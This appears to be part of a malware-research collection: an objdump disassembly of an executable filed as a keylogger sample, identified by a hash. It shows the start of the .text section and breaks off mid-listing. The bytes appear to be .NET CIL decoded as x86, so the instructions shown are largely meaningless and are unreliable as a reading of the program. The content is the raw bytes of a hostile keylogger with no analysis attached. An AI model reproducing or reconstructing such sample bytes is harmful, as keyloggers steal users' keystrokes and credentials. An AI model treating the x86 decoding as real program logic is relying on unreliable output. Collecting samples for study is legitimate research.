
malware_samples/keylogger/ddfc9420dd7d61ff16c24433bb7bc678301f8fae7842fd1298e3851fd04a912e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	30 a5 00 00 00 00    	xor    %ah,0x0(%ebp)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 88 54 00    	add    %al,0x548800
  402013:	00 74 50 00          	add    %dh,0x0(%eax,%edx,2)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	01 00                	add    %eax,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1e                	sub    (%esi),%bl
  402059:	02 28                	add    (%eax),%ch
  40205b:	04 00                	add    $0x0,%al
  40205d:	00 0a                	add    %cl,(%edx)
  40205f:	2a a6 73 06 00 00    	sub    0x673(%esi),%ah
  402065:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40206b:	73 07                	jae    0x402074
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402075:	73 08                	jae    0x40207f
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40207f:	73 09                	jae    0x40208a
  402081:	00 00                	add    %al,(%eax)
  402083:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402089:	2a 00                	sub    (%eax),%al
  40208b:	00 13                	add    %dl,(%ebx)
  40208d:	30 01                	xor    %al,(%ecx)
  40208f:	00 0f                	add    %cl,(%edi)
  402091:	00 00                	add    %al,(%eax)
  402093:	00 01                	add    %al,(%ecx)
  402095:	00 00                	add    %al,(%eax)
  402097:	11 7e 01             	adc    %edi,0x1(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	04 6f                	add    $0x6f,%al
  40209e:	0a 00                	or     (%eax),%al
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	0a 2b                	or     (%ebx),%ch
  4020a4:	00 06                	add    %al,(%esi)
  4020a6:	2a 00                	sub    (%eax),%al
  4020a8:	13 30                	adc    (%eax),%esi
  4020aa:	01 00                	add    %eax,(%eax)
  4020ac:	0f 00 00             	sldt   (%eax)
  4020af:	00 02                	add    %al,(%edx)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	11 7e 02             	adc    %edi,0x2(%esi)
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	04 6f                	add    $0x6f,%al
  4020ba:	0b 00                	or     (%eax),%eax
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	0a 2b                	or     (%ebx),%ch
  4020c0:	00 06                	add    %al,(%esi)
  4020c2:	2a 00                	sub    (%eax),%al
  4020c4:	13 30                	adc    (%eax),%esi
  4020c6:	01 00                	add    %eax,(%eax)
  4020c8:	0f 00 00             	sldt   (%eax)
  4020cb:	00 03                	add    %al,(%ebx)
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	11 7e 03             	adc    %edi,0x3(%esi)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	04 6f                	add    $0x6f,%al
  4020d6:	0c 00                	or     $0x0,%al
  4020d8:	00 0a                	add    %cl,(%edx)
  4020da:	0a 2b                	or     (%ebx),%ch
  4020dc:	00 06                	add    %al,(%esi)
  4020de:	2a 00                	sub    (%eax),%al
  4020e0:	13 30                	adc    (%eax),%esi
  4020e2:	01 00                	add    %eax,(%eax)
  4020e4:	0f 00 00             	sldt   (%eax)
  4020e7:	00 04 00             	add    %al,(%eax,%eax,1)
  4020ea:	00 11                	add    %dl,(%ecx)
  4020ec:	7e 04                	jle    0x4020f2
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	04 6f                	add    $0x6f,%al
  4020f2:	0d 00 00 0a 0a       	or     $0xa0a0000,%eax
  4020f7:	2b 00                	sub    (%eax),%eax
  4020f9:	06                   	push   %es
  4020fa:	2a 00                	sub    (%eax),%al
  4020fc:	13 30                	adc    (%eax),%esi
  4020fe:	02 00                	add    (%eax),%al
  402100:	11 00                	adc    %eax,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	05 00 00 11 02       	add    $0x2110000,%eax
  402109:	03 28                	add    (%eax),%ebp
  40210b:	11 00                	adc    %eax,(%eax)
  40210d:	00 0a                	add    %cl,(%edx)
  40210f:	28 12                	sub    %dl,(%edx)
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 0a                	or     (%edx),%cl
  402115:	2b 00                	sub    (%eax),%eax
  402117:	06                   	push   %es
  402118:	2a 00                	sub    (%eax),%al
  40211a:	00 00                	add    %al,(%eax)
  40211c:	13 30                	adc    (%eax),%esi
  40211e:	01 00                	add    %eax,(%eax)
  402120:	0b 00                	or     (%eax),%eax
  402122:	00 00                	add    %al,(%eax)
  402124:	06                   	push   %es
  402125:	00 00                	add    %al,(%eax)
  402127:	11 02                	adc    %eax,(%edx)
  402129:	28 13                	sub    %dl,(%ebx)
  40212b:	00 00                	add    %al,(%eax)
  40212d:	0a 0a                	or     (%edx),%cl
  40212f:	2b 00                	sub    (%eax),%eax
  402131:	06                   	push   %es
  402132:	2a 00                	sub    (%eax),%al
  402134:	13 30                	adc    (%eax),%esi
  402136:	01 00                	add    %eax,(%eax)
  402138:	0f 00 00             	sldt   (%eax)
  40213b:	00 07                	add    %al,(%edi)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 d0                	adc    %edx,%eax
  402141:	05 00 00 02 28       	add    $0x28020000,%eax
  402146:	14 00                	adc    $0x0,%al
  402148:	00 0a                	add    %cl,(%edx)
  40214a:	0a 2b                	or     (%ebx),%ch
  40214c:	00 06                	add    %al,(%esi)
  40214e:	2a 00                	sub    (%eax),%al
  402150:	13 30                	adc    (%eax),%esi
  402152:	01 00                	add    %eax,(%eax)
  402154:	0b 00                	or     (%eax),%eax
  402156:	00 00                	add    %al,(%eax)
  402158:	08 00                	or     %al,(%eax)
  40215a:	00 11                	add    %dl,(%ecx)
  40215c:	02 28                	add    (%eax),%ch
  40215e:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402163:	2b 00                	sub    (%eax),%eax
  402165:	06                   	push   %es
  402166:	2a 00                	sub    (%eax),%al
  402168:	13 30                	adc    (%eax),%esi
  40216a:	01 00                	add    %eax,(%eax)
  40216c:	18 00                	sbb    %al,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	09 00                	or     %eax,(%eax)
  402172:	00 11                	add    %dl,(%ecx)
  402174:	02 8c 01 00 00 1b 2d 	add    0x2d1b0000(%ecx,%eax,1),%cl
  40217b:	0a 28                	or     (%eax),%ch
  40217d:	01 00                	add    %eax,(%eax)
  40217f:	00 2b                	add    %ch,(%ebx)
  402181:	0a 2b                	or     (%ebx),%ch
  402183:	06                   	push   %es
  402184:	2b 04 02             	sub    (%edx,%eax,1),%eax
  402187:	0a 2b                	or     (%ebx),%ch
  402189:	00 06                	add    %al,(%esi)
  40218b:	2a 13                	sub    (%ebx),%dl
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 10                	add    %dl,(%eax)
  402191:	00 00                	add    %al,(%eax)
  402193:	00 0a                	add    %cl,(%edx)
  402195:	00 00                	add    %al,(%eax)
  402197:	11 03                	adc    %eax,(%ebx)
  402199:	12 00                	adc    (%eax),%al
  40219b:	fe                   	(bad)
  40219c:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  4021a1:	06                   	push   %es
  4021a2:	81 02 00 00 1b 2a    	addl   $0x2a1b0000,(%edx)
  4021a8:	1e                   	push   %ds
  4021a9:	02 28                	add    (%eax),%ch
  4021ab:	17                   	pop    %ss
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	0a 2a                	or     (%edx),%ch
  4021b0:	13 30                	adc    (%eax),%esi
  4021b2:	01 00                	add    %eax,(%eax)
  4021b4:	20 00                	and    %al,(%eax)
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0b 00                	or     (%eax),%eax
  4021ba:	00 11                	add    %dl,(%ecx)
  4021bc:	7e 19                	jle    0x4021d7
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	0a 8c 03 00 00 1b 2d 	or     0x2d1b0000(%ebx,%eax,1),%cl
  4021c7:	0a 28                	or     (%eax),%ch
  4021c9:	02 00                	add    (%eax),%al
  4021cb:	00 2b                	add    %ch,(%ebx)
  4021cd:	80 19 00             	sbbb   $0x0,(%ecx)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	7e 19                	jle    0x4021ed
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a 0a                	or     (%edx),%cl
  4021d8:	2b 00                	sub    (%eax),%eax
  4021da:	06                   	push   %es
  4021db:	2a 1e                	sub    (%esi),%bl
  4021dd:	02 28                	add    (%eax),%ch
  4021df:	17                   	pop    %ss
  4021e0:	00 00                	add    %al,(%eax)
  4021e2:	0a 2a                	or     (%edx),%ch
  4021e4:	13 30                	adc    (%eax),%esi
  4021e6:	02 00                	add    (%eax),%al
  4021e8:	5c                   	pop    %esp
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	00 72 01             	add    %dh,0x1(%edx)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	70 80                	jo     0x402176
  4021f6:	06                   	push   %es
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	04 72                	add    $0x72,%al
  4021fb:	84 00                	test   %al,(%eax)
  4021fd:	00 70 80             	add    %dh,-0x80(%eax)
  402200:	09 00                	or     %eax,(%eax)
  402202:	00 04 72             	add    %al,(%edx,%esi,2)
  402205:	b6 00                	mov    $0x0,%dh
  402207:	00 70 80             	add    %dh,-0x80(%eax)
  40220a:	0a 00                	or     (%eax),%al
  40220c:	00 04 1b             	add    %al,(%ebx,%ebx,1)
  40220f:	80 0b 00             	orb    $0x0,(%ebx)
  402212:	00 04 72             	add    %al,(%edx,%esi,2)
  402215:	e8 00 00 70 80       	call   0x80b0221a
  40221a:	0c 00                	or     $0x0,%al
  40221c:	00 04 72             	add    %al,(%edx,%esi,2)
  40221f:	1a 01                	sbb    (%ecx),%al
  402221:	00 70 80             	add    %dh,-0x80(%eax)
  402224:	0d 00 00 04 72       	or     $0x72040000,%eax
  402229:	4c                   	dec    %esp
  40222a:	01 00                	add    %eax,(%eax)
  40222c:	70 80                	jo     0x4021ae
  40222e:	0e                   	push   %cs
  40222f:	00 00                	add    %al,(%eax)
  402231:	04 72                	add    $0x72,%al
  402233:	6e                   	outsb  %ds:(%esi),(%dx)
  402234:	01 00                	add    %eax,(%eax)
  402236:	70 28                	jo     0x402260
  402238:	1d 00 00 0a 72       	sbb    $0x720a0000,%eax
  40223d:	78 01                	js     0x402240
  40223f:	00 70 28             	add    %dh,0x28(%eax)
  402242:	1e                   	push   %ds
  402243:	00 00                	add    %al,(%eax)
  402245:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  40224b:	2a 1e                	sub    (%esi),%bl
  40224d:	02 28                	add    (%eax),%ch
  40224f:	17                   	pop    %ss
  402250:	00 00                	add    %al,(%eax)
  402252:	0a 2a                	or     (%edx),%ch
  402254:	1e                   	push   %ds
  402255:	02 28                	add    (%eax),%ch
  402257:	17                   	pop    %ss
  402258:	00 00                	add    %al,(%eax)
  40225a:	0a 2a                	or     (%edx),%ch
  40225c:	1b 30                	sbb    (%eax),%esi
  40225e:	04 00                	add    $0x0,%al
  402260:	2e 01 00             	add    %eax,%cs:(%eax)
  402263:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402266:	00 11                	add    %dl,(%ecx)
  402268:	7e 0b                	jle    0x402275
  40226a:	00 00                	add    %al,(%eax)
  40226c:	04 20                	add    $0x20,%al
  40226e:	e8 03 00 00 d8       	call   0xd8402276
  402273:	28 21                	sub    %ah,(%ecx)
  402275:	00 00                	add    %al,(%eax)
  402277:	0a 7e 09             	or     0x9(%esi),%bh
  40227a:	00 00                	add    %al,(%eax)
  40227c:	04 28                	add    $0x28,%al
  40227e:	52                   	push   %edx
  40227f:	00 00                	add    %al,(%eax)
  402281:	06                   	push   %es
  402282:	28 22                	sub    %ah,(%edx)
  402284:	00 00                	add    %al,(%eax)
  402286:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
  40228c:	7e 0a                	jle    0x402298
  40228e:	00 00                	add    %al,(%eax)
  402290:	04 28                	add    $0x28,%al
  402292:	52                   	push   %edx
  402293:	00 00                	add    %al,(%eax)
  402295:	06                   	push   %es
  402296:	28 22                	sub    %ah,(%edx)
  402298:	00 00                	add    %al,(%eax)
  40229a:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  4022a0:	7e 0c                	jle    0x4022ae
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 28                	add    $0x28,%al
  4022a6:	52                   	push   %edx
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	06                   	push   %es
  4022aa:	28 22                	sub    %ah,(%edx)
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  4022b4:	7e 0d                	jle    0x4022c3
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 28                	add    $0x28,%al
  4022ba:	52                   	push   %edx
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	28 22                	sub    %ah,(%edx)
  4022c0:	00 00                	add    %al,(%eax)
  4022c2:	0a 80 0d 00 00 04    	or     0x400000d(%eax),%al
  4022c8:	7e 06                	jle    0x4022d0
  4022ca:	00 00                	add    %al,(%eax)
  4022cc:	04 28                	add    $0x28,%al
  4022ce:	52                   	push   %edx
  4022cf:	00 00                	add    %al,(%eax)
  4022d1:	06                   	push   %es
  4022d2:	28 22                	sub    %ah,(%edx)
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
  4022dc:	de 14 25 28 23 00 00 	ficoms 0x2328(,%eiz,1)
  4022e3:	0a 0d 16 28 24 00    	or     0x242816,%cl
  4022e9:	00 0a                	add    %cl,(%edx)
  4022eb:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4022f1:	00 28                	add    %ch,(%eax)
  4022f3:	69 00 00 06 2d 06    	imul   $0x62d0600,(%eax),%eax
  4022f9:	16                   	push   %ss
  4022fa:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4022fd:	00 0a                	add    %cl,(%edx)
  4022ff:	7e 06                	jle    0x402307
  402301:	00 00                	add    %al,(%eax)
  402303:	04 28                	add    $0x28,%al
  402305:	15 00 00 06 0a       	adc    $0xa060000,%eax
  40230a:	06                   	push   %es
  40230b:	17                   	pop    %ss
  40230c:	8d 2a                	lea    (%edx),%ebp
  40230e:	00 00                	add    %al,(%eax)
  402310:	01 13                	add    %edx,(%ebx)
  402312:	04 11                	add    $0x11,%al
  402314:	04 16                	add    $0x16,%al
  402316:	1f                   	pop    %ds
  402317:	3a 9d 11 04 6f 26    	cmp    0x266f0411(%ebp),%bl
  40231d:	00 00                	add    %al,(%eax)
  40231f:	0a 16                	or     (%esi),%dl
  402321:	9a 80 07 00 00 04 06 	lcall  $0x604,$0x780
  402328:	17                   	pop    %ss
  402329:	8d 2a                	lea    (%edx),%ebp
  40232b:	00 00                	add    %al,(%eax)
  40232d:	01 13                	add    %edx,(%ebx)
  40232f:	04 11                	add    $0x11,%al
  402331:	04 16                	add    $0x16,%al
  402333:	1f                   	pop    %ds
  402334:	3a 9d 11 04 6f 26    	cmp    0x266f0411(%ebp),%bl
  40233a:	00 00                	add    %al,(%eax)
  40233c:	0a 17                	or     (%edi),%dl
  40233e:	9a 80 08 00 00 04 28 	lcall  $0x2804,$0x880
  402345:	5d                   	pop    %ebp
  402346:	00 00                	add    %al,(%eax)
  402348:	06                   	push   %es
  402349:	14 fe                	adc    $0xfe,%al
  40234b:	06                   	push   %es
  40234c:	16                   	push   %ss
  40234d:	00 00                	add    %al,(%eax)
  40234f:	06                   	push   %es
  402350:	73 27                	jae    0x402379
  402352:	00 00                	add    %al,(%eax)
  402354:	0a 73 28             	or     0x28(%ebx),%dh
  402357:	00 00                	add    %al,(%eax)
  402359:	0a 6f 29             	or     0x29(%edi),%ch
  40235c:	00 00                	add    %al,(%eax)
  40235e:	0a 14 fe             	or     (%esi,%edi,8),%dl
  402361:	06                   	push   %es
  402362:	17                   	pop    %ss
  402363:	00 00                	add    %al,(%eax)
  402365:	06                   	push   %es
  402366:	73 27                	jae    0x40238f
  402368:	00 00                	add    %al,(%eax)
  40236a:	0a 73 28             	or     0x28(%ebx),%dh
  40236d:	00 00                	add    %al,(%eax)
  40236f:	0a 0b                	or     (%ebx),%cl
  402371:	14 fe                	adc    $0xfe,%al
  402373:	06                   	push   %es
  402374:	18 00                	sbb    %al,(%eax)
  402376:	00 06                	add    %al,(%esi)
  402378:	73 27                	jae    0x4023a1
  40237a:	00 00                	add    %al,(%eax)
  40237c:	0a 73 28             	or     0x28(%ebx),%dh
  40237f:	00 00                	add    %al,(%eax)
  402381:	0a 0c 07             	or     (%edi,%eax,1),%cl
  402384:	6f                   	outsl  %ds:(%esi),(%dx)
  402385:	29 00                	sub    %eax,(%eax)
  402387:	00 0a                	add    %cl,(%edx)
  402389:	08 6f 29             	or     %ch,0x29(%edi)
  40238c:	00 00                	add    %al,(%eax)
  40238e:	0a 08                	or     (%eax),%cl
  402390:	6f                   	outsl  %ds:(%esi),(%dx)
  402391:	2a 00                	sub    (%eax),%al
  402393:	00 0a                	add    %cl,(%edx)
  402395:	2a 00                	sub    (%eax),%al
  402397:	00 01                	add    %al,(%ecx)
  402399:	10 00                	adc    %al,(%eax)
  40239b:	00 00                	add    %al,(%eax)
  40239d:	00 10                	add    %dl,(%eax)
  40239f:	00 66 76             	add    %ah,0x76(%esi)
  4023a2:	00 14 26             	add    %dl,(%esi,%eiz,1)
  4023a5:	00 00                	add    %al,(%eax)
  4023a7:	01 1b                	add    %ebx,(%ebx)
  4023a9:	30 02                	xor    %al,(%edx)
  4023ab:	00 6a 00             	add    %ch,0x0(%edx)
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	0d 00 00 11 17       	or     $0x17110000,%eax
  4023b5:	28 2b                	sub    %ch,(%ebx)
  4023b7:	00 00                	add    %al,(%eax)
  4023b9:	0a 20                	or     (%eax),%ah
  4023bb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4023be:	00 28                	add    %ch,(%eax)
  4023c0:	2c 00                	sub    $0x0,%al
  4023c2:	00 0a                	add    %cl,(%edx)
  4023c4:	20 0f                	and    %cl,(%edi)
  4023c6:	27                   	daa
  4023c7:	00 00                	add    %al,(%eax)
  4023c9:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4023cf:	0e                   	push   %cs
  4023d0:	25 28 23 00 00       	and    $0x2328,%eax
  4023d5:	0a 0b                	or     (%ebx),%cl
  4023d7:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	73 2e                	jae    0x40240f
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4023e6:	02 6f 2f             	add    0x2f(%edi),%ch
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	0a 0a                	or     (%edx),%cl
  4023ed:	de 2d de 0a 08 2c    	fisubrs 0x2c080ade
  4023f3:	06                   	push   %es
  4023f4:	08 6f 30             	or     %ch,0x30(%edi)
  4023f7:	00 00                	add    %al,(%eax)
  4023f9:	0a dc                	or     %ah,%bl
  4023fb:	de 1f                	ficomps (%edi)
  4023fd:	25 28 23 00 00       	and    $0x2328,%eax
  402402:	0a 0d 20 b8 0b 00    	or     0xbb820,%cl
  402408:	00 28                	add    %ch,(%eax)
  40240a:	21 00                	and    %eax,(%eax)
  40240c:	00 0a                	add    %cl,(%edx)
  40240e:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402414:	c9                   	leave
  402415:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  40241b:	00 06                	add    %al,(%esi)
  40241d:	2a 00                	sub    (%eax),%al
  40241f:	00 01                	add    %al,(%ecx)
  402421:	28 00                	sub    %al,(%eax)
  402423:	00 00                	add    %al,(%eax)
  402425:	00 00                	add    %al,(%eax)
  402427:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  40242a:	00 0e                	add    %cl,(%esi)
  40242c:	26 00 00             	add    %al,%es:(%eax)
  40242f:	01 02                	add    %eax,(%edx)
  402431:	00 31                	add    %dh,(%ecx)
  402433:	00 0c 3d 00 0a 00 00 	add    %cl,0xa00(,%edi,1)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	00 00                	add    %al,(%eax)
  40243e:	2a 00                	sub    (%eax),%al
  402440:	1f                   	pop    %ds
  402441:	49                   	dec    %ecx
  402442:	00 1f                	add    %bl,(%edi)
  402444:	26 00 00             	add    %al,%es:(%eax)
  402447:	01 22                	add    %esp,(%edx)
  402449:	28 41 00             	sub    %al,0x0(%ecx)
  40244c:	00 06                	add    %al,(%esi)
  40244e:	2b 00                	sub    (%eax),%eax
  402450:	2a 00                	sub    (%eax),%al
  402452:	00 00                	add    %al,(%eax)
  402454:	26 28 59 00          	sub    %bl,%es:0x0(%ecx)
  402458:	00 06                	add    %al,(%esi)
  40245a:	26 2b 00             	sub    %es:(%eax),%eax
  40245d:	2a 00                	sub    (%eax),%al
  40245f:	00 ee                	add    %ch,%dh
  402461:	2b 35 73 31 00 00    	sub    0x3173,%esi
  402467:	0a 20                	or     (%eax),%ah
  402469:	b8 0b 00 00 20       	mov    $0x2000000b,%eax
  40246e:	10 27                	adc    %ah,(%edi)
  402470:	00 00                	add    %al,(%eax)
  402472:	6f                   	outsl  %ds:(%esi),(%dx)
  402473:	32 00                	xor    (%eax),%al
  402475:	00 0a                	add    %cl,(%edx)
  402477:	28 21                	sub    %ah,(%ecx)
  402479:	00 00                	add    %al,(%eax)
  40247b:	0a 7e 10             	or     0x10(%esi),%bh
  40247e:	00 00                	add    %al,(%eax)
  402480:	04 2d                	add    $0x2d,%al
  402482:	0a 28                	or     (%eax),%ch
  402484:	29 00                	sub    %eax,(%eax)
  402486:	00 06                	add    %al,(%esi)
  402488:	28 1b                	sub    %bl,(%ebx)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	06                   	push   %es
  40248d:	7e 16                	jle    0x4024a5
  40248f:	00 00                	add    %al,(%eax)
  402491:	04 6f                	add    $0x6f,%al
  402493:	33 00                	xor    (%eax),%eax
  402495:	00 0a                	add    %cl,(%edx)
  402497:	26 17                	es pop %ss
  402499:	2d c8 2a c6 16       	sub    $0x16c62ac8,%eax
  40249e:	80 10 00             	adcb   $0x0,(%eax)
  4024a1:	00 04 14             	add    %al,(%esp,%edx,1)
  4024a4:	80 11 00             	adcb   $0x0,(%ecx)
  4024a7:	00 04 16             	add    %al,(%esi,%edx,1)
  4024aa:	6a 80                	push   $0xffffff80
  4024ac:	12 00                	adc    (%eax),%al
  4024ae:	00 04 14             	add    %al,(%esp,%edx,1)
  4024b1:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  4024b5:	04 14                	add    $0x14,%al
  4024b7:	80 15 00 00 04 16 73 	adcb   $0x73,0x16040000
  4024be:	35 00 00 0a 80       	xor    $0x800a0000,%eax
  4024c3:	16                   	push   %ss
  4024c4:	00 00                	add    %al,(%eax)
  4024c6:	04 14                	add    $0x14,%al
  4024c8:	80 17 00             	adcb   $0x0,(%edi)
  4024cb:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	1e                   	push   %ds
  4024d1:	02 28                	add    (%eax),%ch
  4024d3:	17                   	pop    %ss
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	0a 2a                	or     (%edx),%ch
  4024d8:	32 7e 07             	xor    0x7(%esi),%bh
  4024db:	00 00                	add    %al,(%eax)
  4024dd:	04 28                	add    $0x28,%al
  4024df:	1c 00                	sbb    $0x0,%al
  4024e1:	00 06                	add    %al,(%esi)
  4024e3:	26 2a 00             	sub    %es:(%eax),%al
  4024e6:	00 00                	add    %al,(%eax)
  4024e8:	1b 30                	sbb    (%eax),%esi
  4024ea:	07                   	pop    %es
  4024eb:	00 30                	add    %dh,(%eax)
  4024ed:	01 00                	add    %eax,(%eax)
  4024ef:	00 0e                	add    %cl,(%esi)
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	11 18                	adc    %ebx,(%eax)
  4024f5:	17                   	pop    %ss
  4024f6:	1c 73                	sbb    $0x73,%al
  4024f8:	36 00 00             	add    %al,%ss:(%eax)
  4024fb:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  402501:	15 6a 80 12 00       	adc    $0x12806a,%eax
  402506:	00 04 17             	add    %al,(%edi,%edx,1)
  402509:	8d 36                	lea    (%esi),%esi
  40250b:	00 00                	add    %al,(%eax)
  40250d:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  402513:	73 37                	jae    0x40254c
  402515:	00 00                	add    %al,(%eax)
  402517:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  40251d:	7e 11                	jle    0x402530
  40251f:	00 00                	add    %al,(%eax)
  402521:	04 20                	add    $0x20,%al
  402523:	00 c8                	add    %cl,%al
  402525:	00 00                	add    %al,(%eax)
  402527:	6f                   	outsl  %ds:(%esi),(%dx)
  402528:	38 00                	cmp    %al,(%eax)
  40252a:	00 0a                	add    %cl,(%edx)
  40252c:	7e 11                	jle    0x40253f
  40252e:	00 00                	add    %al,(%eax)
  402530:	04 20                	add    $0x20,%al
  402532:	00 c8                	add    %cl,%al
  402534:	00 00                	add    %al,(%eax)
  402536:	6f                   	outsl  %ds:(%esi),(%dx)
  402537:	39 00                	cmp    %eax,(%eax)
  402539:	00 0a                	add    %cl,(%edx)
  40253b:	7e 11                	jle    0x40254e
  40253d:	00 00                	add    %al,(%eax)
  40253f:	04 02                	add    $0x2,%al
  402541:	7e 08                	jle    0x40254b
  402543:	00 00                	add    %al,(%eax)
  402545:	04 28                	add    $0x28,%al
  402547:	3a 00                	cmp    (%eax),%al
  402549:	00 0a                	add    %cl,(%edx)
  40254b:	6f                   	outsl  %ds:(%esi),(%dx)
  40254c:	3b 00                	cmp    (%eax),%eax
  40254e:	00 0a                	add    %cl,(%edx)
  402550:	02 80 07 00 00 04    	add    0x4000007(%eax),%al
  402556:	17                   	pop    %ss
  402557:	80 10 00             	adcb   $0x0,(%eax)
  40255a:	00 04 73             	add    %al,(%ebx,%esi,2)
  40255d:	17                   	pop    %ss
  40255e:	00 00                	add    %al,(%eax)
  402560:	0a 28                	or     (%eax),%ch
  402562:	11 00                	adc    %eax,(%eax)
  402564:	00 0a                	add    %cl,(%edx)
  402566:	80 17 00             	adcb   $0x0,(%edi)
  402569:	00 04 28             	add    %al,(%eax,%ebp,1)
  40256c:	1d 00 00 06 28       	sbb    $0x28060000,%eax
  402571:	22 00                	and    (%eax),%al
  402573:	00 0a                	add    %cl,(%edx)
  402575:	28 27                	sub    %ah,(%edi)
  402577:	00 00                	add    %al,(%eax)
  402579:	06                   	push   %es
  40257a:	16                   	push   %ss
  40257b:	80 1a 00             	sbbb   $0x0,(%edx)
  40257e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402581:	11 00                	adc    %eax,(%eax)
  402583:	00 04 7e             	add    %al,(%esi,%edi,2)
  402586:	13 00                	adc    (%eax),%eax
  402588:	00 04 16             	add    %al,(%esi,%edx,1)
  40258b:	7e 13                	jle    0x4025a0
  40258d:	00 00                	add    %al,(%eax)
  40258f:	04 8e                	add    $0x8e,%al
  402591:	b7 16                	mov    $0x16,%bh
  402593:	14 fe                	adc    $0xfe,%al
  402595:	06                   	push   %es
  402596:	25 00 00 06 73       	and    $0x73060000,%eax
  40259b:	3c 00                	cmp    $0x0,%al
  40259d:	00 0a                	add    %cl,(%edx)
  40259f:	14 6f                	adc    $0x6f,%al
  4025a1:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  4025a6:	14 fe                	adc    $0xfe,%al
  4025a8:	06                   	push   %es
  4025a9:	2c 00                	sub    $0x0,%al
  4025ab:	00 06                	add    %al,(%esi)
  4025ad:	73 3e                	jae    0x4025ed
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	0a 0b                	or     (%ebx),%cl
  4025b3:	07                   	pop    %es
  4025b4:	14 73                	adc    $0x73,%al
  4025b6:	31 00                	xor    %eax,(%eax)
  4025b8:	00 0a                	add    %cl,(%edx)
  4025ba:	20 10                	and    %dl,(%eax)
  4025bc:	27                   	daa
  4025bd:	00 00                	add    %al,(%eax)
  4025bf:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025c5:	32 00                	xor    (%eax),%al
  4025c7:	00 0a                	add    %cl,(%edx)
  4025c9:	73 31                	jae    0x4025fc
  4025cb:	00 00                	add    %al,(%eax)
  4025cd:	0a 20                	or     (%eax),%ah
  4025cf:	10 27                	adc    %ah,(%edi)
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025d9:	32 00                	xor    (%eax),%al
  4025db:	00 0a                	add    %cl,(%edx)
  4025dd:	73 3f                	jae    0x40261e
  4025df:	00 00                	add    %al,(%eax)
  4025e1:	0a 80 15 00 00 04    	or     0x4000015(%eax),%al
  4025e7:	14 fe                	adc    $0xfe,%al
